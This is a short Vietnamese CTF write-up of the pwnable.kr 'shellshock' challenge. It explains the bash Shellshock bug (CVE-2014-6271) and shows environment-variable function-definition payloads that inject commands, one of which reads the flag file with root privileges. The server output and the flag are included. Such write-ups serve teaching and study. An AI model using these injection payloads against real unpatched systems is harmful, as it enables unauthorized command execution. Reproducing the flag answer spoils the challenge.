# Source

Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

[Source]()

# 📚Theory (Shellshock)

- Shellshock có cơ chế hoạt động là khi một shell được gọi và export một biến môi trường (Ở đây là một hàm được định nghĩa). Sau đó shell thứ 2 được gọi, nó sẽ thấy biến môi trường được export trước đó và thực hiện đánh giá và lưu nó. Tuy nhiên khi đánh giá, nó không chỉ dừng lại khi hàm kết thúc ( kết thúc với dấu __;__). Điều này khiến cho hacker có thể chèn thêm câu lệnh vào sau khai báo hàm để shell khi đánh giá biến môi trường này sẽ đồng thời thực thi câu lệnh đó.
- `env func='() { :;}; echo Hacked' bash -c`
    - env: dùng để khai báo biến môi trường.
    - func: tên biến
    - '': bên trong dấu nháy đơn là khai báo hàm, kẻ tấn công đã chèn thêm câu lệnh `echo Hacked`.
    - bash -c: gọi đến một shell thứ 2, shell này sẽ xem các biến môi trường, đồng thời thực thi luôn payload đã bị tiêm vào.

[Tham khảo](https://fedoramagazine.org/shellshock-how-does-it-actually-work/)

# Solve

- Ở đây, hiểu được cơ chế hoạt động của shellshock. Đồng thời, phân tích source code của file shellshock thì biết được shell trong chương trình được thực thi với uid của root.
=> Kết hợp điều này, payload sẽ là:
```bash
$ env x='() { :;}; /bin/cat flag' ./shellshock
```
- Chạy payload trên server:
```bash
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
shellshock@pwnable:~$
```
### 🚩Flag: `only if I knew CVE-2014-6271 ten years ago..!!`